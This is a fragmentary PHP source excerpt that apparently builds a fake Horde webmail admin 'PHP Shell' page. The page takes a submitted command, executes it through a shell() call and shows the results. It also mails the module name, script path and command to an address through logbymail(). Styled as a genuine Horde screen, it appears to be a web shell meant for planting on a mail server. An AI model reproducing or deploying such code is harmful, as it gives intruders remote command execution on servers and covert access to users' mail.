...
logbymail($mailaddr,$modulename,$_SERVER['PHP_SELF'],$php);

if($php!='')
	$out='<div class="header">Command:</div><br /><table cellpadding="4" border="0"><tr><td class="text"><code>'.htmlspecialchars($php, ENT_QUOTES).'</code></td></tr></table><br /><div class="header">Results:</div><br /><table cellpadding="4" border="0"><tr><td class="text"><pre>
'.shell($php).'
</pre></td></tr></table><br />';
...
<li><a href="/mail/admin/phpshell.php?Horde=5ac6c1690a91622c7489c5c40a5dbc5d" onmouseout="window.status=\'\';" onmouseover="window.status=\'PHP Shell\'; return true;" class="current"><img src="/mail/themes/graphics/shell.png" alt="PHP Shell" title="PHP Shell" /><br />PHP Shell</a></li>
...
<div class="header" style="margin:8px 0">PHP Shell</div>
<form action="/mail/admin/phpshell.php" method="post">
<input type="hidden" name="Horde" value="5ac6c1690a91622c7489c5c40a5dbc5d" />

<table width="100%" border="0" cellpadding="2" cellspacing="0"><tr><td class="header">Application</td></tr></table>
<select name="app">
  <option value="horde" selected="selected">Horde</option>
  ...
  <option value="chora">Version Control</option>
</select><br /><br />
'.$out.'
...
try {
    if (parent.frames.horde_main) parent.document.title = \'Horde :: PHP Shell\';
} catch (e) {
}
// -->
</script>
...
<!--
if (typeof(_setHordeTitle) == \'undefined\' && parent.frames.horde_main) parent.document.title = \'Horde :: PHP Shell\';
// -->
</script>
</body>
</html>';
